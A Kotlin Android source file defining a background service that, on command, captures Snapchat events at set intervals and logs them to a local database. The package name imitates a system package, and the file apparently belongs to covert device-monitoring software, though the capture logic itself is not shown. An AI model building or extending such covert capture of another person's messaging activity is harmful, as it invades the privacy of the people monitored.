package com.android.services.services.snapchat


import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [SnapChatEventCommandService] is a Service to capture the snapChatEvent in a background Service,
 * This service receives a Command to start capturing snapChatEvents, and captures every snapChatEvent
 * after a specified Interval defined in snapChatEvent Command
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class SnapChatEventCommandService : Service() {

    // LocalDatabase Source
    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope

    // [IBackgroundProcessing] Interface
    lateinit var snapChatEventProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        snapChatEventProcessingI =
            SnapChatEventCommandProcessingImplI(this, localDatabaseSource, coroutineScope)
        snapChatEventProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return snapChatEventProcessingI.onStartCommand(intent!!, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        snapChatEventProcessingI.onDestroy()
    }
}